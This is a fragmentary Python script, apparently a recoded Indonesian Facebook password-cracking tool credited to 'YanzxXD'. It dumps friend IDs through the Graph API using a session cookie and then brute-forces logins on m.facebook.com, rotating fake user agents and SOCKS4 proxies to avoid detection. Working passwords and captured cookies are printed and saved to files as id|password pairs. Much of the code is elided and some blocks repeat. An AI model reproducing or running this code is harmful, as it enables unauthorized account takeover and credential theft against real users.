...
for x in range(10):
	...
	uak=f'Mozilla/5.0 (Windows NT {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
...
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(panel(f"""[bold green]   __  __  _    _  _    _______  _____   ____   ______  
 |  \/  || |  | || |  |__   __||_   _| |  _ \ |  ____| 
 | \  / || |  | || |     | |     | |   | |_) || |__    
 | |\/| || |  | || |     | |     | |   |  _ < |  __|   
 | |  | || |__| || |____ | |    _| |_  | |_) || |      
 |_|  |_| \____/ |______||_|   |_____| |____/ |_|      
                                                       
 [bold red] RECODE:YanzxXD                                             
 [bold red] WA:0822******86          
...
def brayen_dump():
	...
	try:
		...
		koH = requests.get('https://graph.facebook.com/{}'.format(pil),params=params,cookies={'cookie': kukis}).json()
...
def validate1(idf,pwv):
	...
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu['Mozilla/5.0 (Linux; U; Android 8.0.0; en-us; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 PHX/10.0']
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=7471144296230708&kid_directed_site=0&app_id=7471144296230708&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fapp_id%3D7471144296230708%26cbt%3D1697385341122%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2047134bbaf1d8%2526domain%253Dwww.g2g.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.g2g.com%25252Ff379e797dbd83e4%2526relation%253Dopener%26client_id%3D7471144296230708%26display%3Dtouch%26domain%3Dwww.g2g.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.g2g.com%252Flogin%26locale%3Den_US%26logger_id%3Df5c31a348e0ea%26origin%3D2%26redirect_uri%3D')
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='YanzxXD-CP')
					cetak(statuscp1)
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold blue', title='YanzxXD-OK')
					cetak(statusok1)
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='YanzxXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
...
'bi_xrwh': 0
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='YamzxXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
